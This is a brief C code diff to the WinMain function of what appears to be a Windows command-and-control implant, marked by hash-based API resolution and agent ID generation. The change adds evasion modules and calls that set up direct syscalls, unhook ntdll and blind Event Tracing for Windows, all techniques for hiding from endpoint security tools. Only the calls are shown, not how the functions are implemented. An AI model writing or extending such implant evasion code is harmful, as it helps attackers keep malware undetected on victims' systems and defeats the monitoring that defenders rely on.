@@ -3,6 +3,9 @@
 #include "Transport.h"
 #include "Resolve.h"
 #include "Hashes.h"
+#include "Evasion.h"
+#include "Syscall.h"
+#include "Unhook.h"
 #include <stdio.h>
 #include <iptypes.h>
 #include <iphlpapi.h>
@@ -208,6 +211,10 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, INT nShow){
         pLoadLib((LPCSTR)s2);
         pLoadLib((LPCSTR)s3);
     }
+
+    InitSyscalls();
+    UnhookNtdll();
+    EtwBlind();
 
     g_AgentID = GenAgentID();
     fn_Sleep pSleep = (fn_Sleep)ResolveFuncH(k32, H_Sleep);
